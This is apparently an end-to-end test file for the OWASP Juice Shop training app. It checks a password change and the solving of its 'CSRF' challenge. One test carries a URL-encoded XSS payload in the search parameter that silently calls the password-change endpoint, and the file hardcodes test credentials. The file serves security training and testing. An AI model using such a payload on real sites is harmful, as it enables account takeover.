'use strict'

describe('/#/change-password', function () {
  var currentPassword, newPassword, newPasswordRepeat, changeButton

  describe('as bender', function () {
    protractor.beforeEach.login({email: 'bender@juice-sh.op', password: 'OhG0dPlease1nsertLiquor!'})

    beforeEach(function () {
      browser.get('/#/change-password')
      currentPassword = element(by.model('currentPassword'))
      newPassword = element(by.model('newPassword'))
      newPasswordRepeat = element(by.model('newPasswordRepeat'))
      changeButton = element(by.id('changeButton'))
    })

    it('should be able to change password', function () {
      currentPassword.sendKeys('OhG0dPlease1nsertLiquor!')
      newPassword.sendKeys('genderBender')
      newPasswordRepeat.sendKeys('genderBender')
      changeButton.click()

      expect(element(by.css('.alert-info')).getAttribute('class')).not.toMatch('ng-hide')
    })
  })

  describe('challenge "csrf"', function () {
    protractor.beforeEach.login({email: 'bender@juice-sh.op', password: 'genderBender'})

    it('should be able to change password via XSS-powered CSRF-attack on password change without passing current password', function () {
      browser.get('/#/search?q=%3Cscript%3Exmlhttp%20%3D%20new%20XMLHttpRequest;%20xmlhttp.open(\'GET\',%20\'http:%2F%2Flocalhost:3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic\');%20xmlhttp.send()%3C%2Fscript%3E')
      browser.get('/#/login')
      element(by.model('user.email')).sendKeys('bender@juice-sh.op')
      element(by.model('user.password')).sendKeys('slurmCl4ssic')
      element(by.id('loginButton')).click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'CSRF'})
  })
})
